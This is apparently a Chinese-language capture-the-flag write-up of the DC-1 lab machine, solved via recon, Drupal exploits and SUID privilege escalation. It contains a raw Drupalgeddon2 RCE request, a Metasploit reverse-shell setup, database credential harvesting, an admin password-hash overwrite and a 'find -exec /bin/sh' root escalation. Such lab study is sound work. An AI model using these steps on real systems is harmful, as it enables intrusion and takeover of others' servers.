---
title: DC1
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-01T15:06:40+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l 
```

寻找到目标ip地址,得到同一网段中的DC1靶机IP

```
192.168.121.144
```

![ip](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\ip.png)

直接访问无法连接，nmap扫描目标开放端口

```
nmap -A 192.168.121.144 -F  //仅扫描100个常用端口
```

![nmap](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\nmap.png)

可以看到看到开放80端口等信息，且8080为apache服务，尝试访问各个端口，仅80端口能够正常访问，访问该页面仅能看到一个登录框，以及跳转按钮，先收集目录信息，这里采用gobuster进行扫描

```
┌──(root㉿kali)-[~/Desktop]
└─# gobuster dir -u http://192.168.121.144 -w /usr/share/wordlists/dirb/big.txt 
```

扫描得到以下路径

```
/0                    (Status: 200) [Size: 7648]
/LICENSE              (Status: 200) [Size: 18092]
/README               (Status: 200) [Size: 5376]
/includes             (Status: 301) [Size: 321] [--> http://192.168.121.144/includes/]
/misc                 (Status: 301) [Size: 317] [--> http://192.168.121.144/misc/]
/modules              (Status: 301) [Size: 320] [--> http://192.168.121.144/modules/]
/node                 (Status: 200) [Size: 7648]
/profiles             (Status: 301) [Size: 321] [--> http://192.168.121.144/profiles/]
/robots.txt
```

在各个目录中获取信息，发现该站点是由Drupal开发,并且robots.txt中给出了防止爬取的站点，大致猜测是要去获取这些页面

由于知道了该站点是由Drupal开发，在网上搜索一些历史漏洞尝试利用

```
CVE-2019-6340
漏洞地址位于/node/?_format=hal_json
但该站点无法访问该页面，或许存在重定向
```

```
CVE-2018-7600
漏洞利用数据包如下
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```

都无法利用成功，上msf,

```
msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution

```

随便尝试一个漏洞

```
use 2
set RHOSTS 192.168.121.144
set LHOST 192.168.121.135
set LPORT 4444
run
```

成功拿到反向shell

![reverse_shell](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\reverse_shell.png)

拿到第一个flag

```
meterpreter > cat flag1.txt
Every good CMS needs a config file - and so do you.
```

使用python升级为交互式shells

```
meterpreter > shell
Process 3522 created.
Channel 3 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@DC-1:/var/www$ 
```

![python_up](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\python_up.png)

第一个fla提示我们查看配置文件，

```xml
<match url="\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|^(\..*|Entries.*|Repository|Root|Tag|Template)$" />
```

配置文件中给出了黑名单，顺带查看了/etc/passwd文件，能够看到其中的flag4的影子,但是这个文件好像没有什么用，查看一下对应cms的配置文件，对应文件位于

```
/var/www/sites/default/settings.php
```

在文件中看到flag2

![flag2](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\flag2.png)

以及数据库的信息

```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

flag2提示我们能用这些证书干什么，尝试登录mysql

```
mysql -u dbuser -p
R0ck3t
```

成功登录mysql,查看一下有哪些表，发现存在users表，直接select

```
select * from users;
```

![users](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\users.png)

密码通过hash加密，刚才在翻目录的时候似乎看到了.sh文件，可以返回去找一下，找到一的password-hash.sh

cat一下发现是一个php，该文件引用了/includes/password.inc和'/includes/bootstrap.inc',跟过去查看一下，看了半天发现password-hash.sh是可以自己生成hash的，我们可以用该hash值来替换数据库中admin的密码

```
php scripts/password-hash.sh 12345 //在上级目录正确执行
```

得到hash值

```
password: 12345                 hash: $S$Dji8xJ25v5XuetJPsCUcJF9iRoUnW3VJf7.vVycDkCqCUHymZwFf
```

再用该hash值替换admin处的hash

```
mysql> update users set pass='$S$Dji8xJ25v5XuetJPsCUcJF9iRoUnW3VJf7.vVycDkCqCUHymZwFf' where name='admin';
<JF9iRoUnW3VJf7.vVycDkCqCUHymZwFf' where name='admin';                       
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

再回到页面即可成功登录admin账户，在后台发现flag3

![flag3](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\flag3.png)

提示我们特殊的PERMS,需要提权

https://xz.aliyun.com/t/12535看了一下文章关于suid提权

```
find / -perm -u=s -type f 2>/dev/null
查找可执行的二进制文件
/usr/bin/find . -exec /bin/sh \;
执行-exec拿到root权限
```

![find](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\find.png)

能找到较全的提权指令

最后的flag位于/root下

![finalflag](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\finalflag.png)

后面再看wp时发现flag4其实就是/ect/passwd中的那个，但是/etc/passwd不需要root权限也能够cat

![flag4](E:\笔记软件\笔记\渗透测试\靶机练习\DC1图库\flag4.png)

### 总结：

整个靶机做下来不会让人找不到方向，在mysql修改admin的密码时，会让人不知所措，第一时间想到的可能会是去破解该hash，还好在拿到反向shell的时候基本把目录都翻了一遍注意到了hash文件，难点大概在于提权位置(还不怎么熟悉)，以及passwd-hash.sh的利用，都参考了部分wp,最开始去看了看.sh文件，想直接拿过来在本地生成hash密码，没有想到能够在服务端上直接执行
